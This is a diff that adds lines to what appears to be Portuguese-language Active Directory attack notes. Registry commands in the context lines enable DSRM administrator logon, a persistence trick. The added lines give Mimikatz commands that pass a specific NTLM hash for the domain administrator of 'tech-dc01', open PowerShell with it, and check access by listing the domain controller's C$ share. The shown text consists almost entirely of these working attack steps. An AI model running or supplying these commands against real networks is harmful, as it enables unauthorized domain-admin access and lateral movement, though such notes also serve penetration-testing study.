@@ -1536,8 +1536,15 @@ New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminL
 Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
 Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
 ```
-
-
+EM QUALQUER COMPUTADOR DA REDE, FAZER O PASS THE HASH. (PROMPT ELEVADO)
+```
+Privilege::debug
+Sekurlsa::pth /user:administrator /domain:tech-dc01 /ntlm:58056bc12cea73a9ce6ea02727fbd8f0 /run:powershell.exe
+```
+TESTAR A CONEXÃO NO NOVA JANELA:
+```
+dir \\tech-dc01\c$
+```
 
 
 
